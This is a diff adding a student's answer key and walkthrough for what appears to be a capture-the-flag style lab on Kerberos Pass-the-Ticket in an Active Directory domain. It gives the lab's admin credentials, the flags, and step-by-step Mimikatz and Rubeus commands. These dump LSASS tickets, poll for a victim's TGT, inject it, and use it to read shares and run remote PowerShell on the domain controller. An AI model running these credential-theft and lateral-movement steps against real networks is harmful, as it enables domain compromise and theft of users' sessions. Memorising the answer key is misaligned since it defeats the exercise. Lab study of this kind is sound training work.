@@ -257,7 +257,131 @@ inlanefreight\john
 
 ## Exercise
 
-*Add exercise answers here as you complete them*
+**Target:** `10.129.204.23` (MS01) — RDP `Administrator:AnotherC0mpl3xP4$$`
+**Domain:** `inlanefreight.htb` — DC01 reachable via FQDN `DC01.inlanefreight.htb`
+
+### Answers
+
+| # | Question | Answer |
+|---|----------|--------|
+| 1 | TGTs collected from LSASS (initial dump) | **3** |
+| 2 | Flag from `\\DC01.inlanefreight.htb\john\flag.txt` | `Learn1ng_M0r3_Tr1cks_with_J0hn` |
+| 3 | Flag from `C:\john\john.txt` via PSRemoting | `P4$$_th3_Tick3T_PSR` |
+
+---
+
+### Q1 — Count TGTs in memory
+
+RDP into MS01 as Administrator and dump tickets:
+
+```cmd
+mkdir C:\tickets && cd C:\tickets
+C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
+```
+
+Or with Rubeus (cleaner output, Base64 instead of `.kirbi`):
+
+```cmd
+C:\tools\Rubeus.exe dump /service:krbtgt /nowrap
+```
+
+Initial dump shows **3 TGTs** for `krbtgt/INLANEFREIGHT.HTB`:
+- `DC01$` (LUID `0x39dc9`) — machine account, network logon
+- `svc_workstations` (LUID `0x40daf`) — service account
+- `DC01$` (LUID `0x3e7`) — machine account, SYSTEM session
+
+> 💡 john's TGT is **not** present initially. The lab uses a scheduled task that authenticates john periodically (~every 1–3 min) — wait for it to fire.
+
+---
+
+### Q2 — PtT to read john's flag from SMB share
+
+**Step 1 — Wait for john's TGT** with a polling loop in PowerShell:
+
+```powershell
+cd C:\tickets
+while ($true) {
+    Remove-Item *.kirbi -ErrorAction SilentlyContinue
+    C:\tools\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit | Out-Null
+    $johnTicket = Get-ChildItem *john@krbtgt*.kirbi -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($johnTicket) {
+        Write-Host "[+] Found john's TGT: $($johnTicket.Name)" -ForegroundColor Green
+        break
+    }
+    Write-Host "[-] No john TGT yet, waiting 30s... ($(Get-Date -Format HH:mm:ss))"
+    Start-Sleep -Seconds 30
+}
+```
+
+Eventually yields e.g. `[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi`.
+
+**Step 2 — Inject the ticket** with Mimikatz:
+
+```cmd
+C:\tools\mimikatz.exe "privilege::debug" "kerberos::ptt C:\tickets\[0;4f3a1]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi" exit
+klist
+```
+
+Confirm `Client: john @ INLANEFREIGHT.HTB` with `Cache Flags: 0x1 -> PRIMARY`.
+
+**Step 3 — Enumerate shares on DC01** (Kerberos auth uses cached TGT automatically — must use FQDN):
+
+```cmd
+net view \\DC01.inlanefreight.htb
+```
+
+Output reveals user-named shares: `carlos`, `david`, `john`, `julio`, `linux01`, `svc_workstations` (no `$` suffix — they're regular shares, not admin shares).
+
+**Step 4 — Read the flag:**
+
+```powershell
+type \\DC01.inlanefreight.htb\john\flag.txt
+# → Learn1ng_M0r3_Tr1cks_with_J0hn
+```
+
+> ⚠️ **Path gotcha:** Initial guess `\\DC01\john$\flag.txt` fails — share is `john`, not `john$`. Always run `net view` first.
+
+---
+
+### Q3 — PtT + PSRemoting to read `C:\john\john.txt`
+
+With john's TGT still in memory (or re-PtT if evicted), open a remote PowerShell session:
+
+```powershell
+Enter-PSSession -ComputerName DC01.inlanefreight.htb
+```
+
+Kerberos auth is automatic — no creds prompted. `klist` after entering shows new service tickets minted on demand:
+- `HTTP/DC01.inlanefreight.htb` (WSMan / PSRemoting)
+- `cifs/DC01.inlanefreight.htb` (SMB)
+
+Inside the remote session:
+
+```powershell
+[DC01.inlanefreight.htb]: PS C:\Users\john\Documents> type C:\john\john.txt
+P4$$_th3_Tick3T_PSR
+```
+
+**One-shot alternative** (no interactive session):
+
+```powershell
+Invoke-Command -ComputerName DC01.inlanefreight.htb -ScriptBlock { type C:\john\john.txt }
+```
+
+> 💡 `Enter-PSSession` requires the FQDN for Kerberos SPN lookup — `Enter-PSSession DC01` (short name) may fall back to NTLM and fail without explicit creds.
+
+---
+
+### Lessons Learned
+
+1. **LSASS only holds active session tickets.** If a target user hasn't logged on recently, their TGT won't be in memory — wait for scheduled tasks / triggers.
+2. **Polling loops > one-shot dumps** when waiting for periodic logons. Re-dump every 30s and check for the target's `.kirbi` filename pattern.
+3. **`sekurlsa::tickets /export`** writes `.kirbi` files named `[LUID]-N-N-FLAGS-USER@SERVICE-DOMAIN.kirbi` — easy to glob.
+4. **Always enumerate shares with `net view`** before guessing paths — share names may not match user/host conventions (`john` not `john$`, `Users` not `C$\Users`).
+5. **Kerberos requires FQDN.** SPNs are bound to hostnames; using IP or short name forces NTLM fallback.
+6. **PSRemoting auto-mints service tickets** (`HTTP/...` for WSMan, `cifs/...` for SMB) once a TGT is loaded — no extra work needed.
+7. **`Enter-PSSession` ≠ `Invoke-Command`.** When pasting commands, the typed `exit` runs *before* the remote `type` if pasted as a multi-line block — use `Invoke-Command` for one-shot reliability.
+8. **Filename brackets in PowerShell** — `[0;4f3a1]-...` is interpreted as a wildcard. Wrap path in quotes or `cd` into the directory and use just the filename.
 
 ---
 
